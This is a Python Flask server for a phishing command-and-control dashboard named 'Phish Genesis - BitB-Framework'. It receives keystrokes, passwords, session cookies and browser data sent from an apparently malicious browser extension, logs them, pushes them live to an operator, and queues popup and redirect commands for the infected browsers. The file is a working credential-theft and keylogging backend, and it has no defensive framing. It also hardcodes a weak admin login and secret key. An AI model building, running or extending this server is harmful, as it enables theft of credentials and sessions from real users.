from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO, emit
from datetime import datetime
import os
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'phish-genesis-bitb-secret-2026'
socketio = SocketIO(app, cors_allowed_origins="*")

LOG_FOLDER = "/home/kali/BitB-Framework/logs"
os.makedirs(LOG_FOLDER, exist_ok=True)

pending_commands = []

# ==================== LOGIN PAGE[](http://localhost:5000) ====================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == "admin" and password == "password123":
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid username or password")
    
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    
    return render_template('login.html')

# ==================== MAIN DASHBOARD (Protected) ====================
@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('dashboard.html')

# ==================== EXTENSION API ENDPOINTS (Public - no login required) ====================
@app.route('/log', methods=['POST'])
def receive_log():
    try:
        data = request.get_json()
        log_type = data.get('type')
        timestamp = datetime.now().strftime("%H:%M:%S")

        with open(f"{LOG_FOLDER}/{log_type}.log", "a", encoding='utf-8') as f:
            f.write(f"[{timestamp}] {json.dumps(data)}\n")

        if log_type == "keystroke":
            socketio.emit('new_keystroke', {"time": timestamp, "data": data.get('data'), "url": data.get('url', '')})
        elif log_type == "credentials":
            socketio.emit('new_credential', {"time": timestamp, "data": data.get('data')})
        elif log_type == "cookies":
            socketio.emit('new_cookies', data)

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get_logs', methods=['GET'])
def get_logs():
    log_type = request.args.get('type', 'all')
    logs = []
    files = {'keystroke': 'keystroke.log', 'credentials': 'credentials.log', 'cookies': 'cookies.log', 'browserInfo': 'browserInfo.log'}
    
    for key, filename in files.items():
        if log_type == 'all' or log_type == key:
            filepath = f"{LOG_FOLDER}/{filename}"
            if os.path.exists(filepath):
                try:
                    with open(filepath, "r", encoding='utf-8') as f:
                        for line in f:
                            logs.append({"type": key, "raw": line.strip()})
                except:
                    pass
    return jsonify(logs)

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    try:
        for f in ['keystroke.log', 'credentials.log', 'cookies.log', 'browserInfo.log']:
            open(f"{LOG_FOLDER}/{f}", "w").close()
        return jsonify({"status": "ok"})
    except:
        return jsonify({"status": "error"}), 500

@app.route('/command/popup', methods=['POST'])
def command_popup():
    message = request.form.get('message', 'Test from BitB Framework')
    pending_commands.append({'action': 'popup', 'message': message})
    return "Popup command stored"

@app.route('/command/redirect', methods=['POST'])
def command_redirect():
    url = request.form.get('url', 'https://example.com')
    pending_commands.append({'action': 'redirect', 'url': url})
    return "Redirect command stored"

@app.route('/get_commands', methods=['GET'])
def get_commands():
    cmds = pending_commands.copy()
    pending_commands.clear()
    return jsonify(cmds)

# ==================== COOKIES PAGE (Protected) ====================
@app.route('/cookies')
def cookies_page():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('cookies.html')
   
@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    print("🚀 Phish Genesis - BitB-Framework Dashboard STARTED on http://localhost:5000")
    print("   Login → admin / password123")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
